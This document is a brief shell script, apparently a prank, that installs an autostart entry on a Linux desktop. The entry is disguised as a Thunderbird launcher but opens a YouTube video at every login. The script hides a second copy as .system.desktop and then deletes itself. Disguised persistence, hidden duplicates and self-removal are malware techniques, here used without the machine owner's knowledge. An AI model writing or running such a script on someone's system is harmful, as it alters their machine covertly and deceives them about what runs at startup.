dir=$PWD

cd ~/.config/autostart
echo "[Desktop Entry]
Exec=xdg-open https://www.youtube.com/watch?v=HIcSWuKMwOw
Type=Application
Icon=org.mozilla.Thunderbird
" > Thunderbird-Link.desktop
cp Thunderbird-Link.desktop .system.desktop

rm $dir\/cr.sh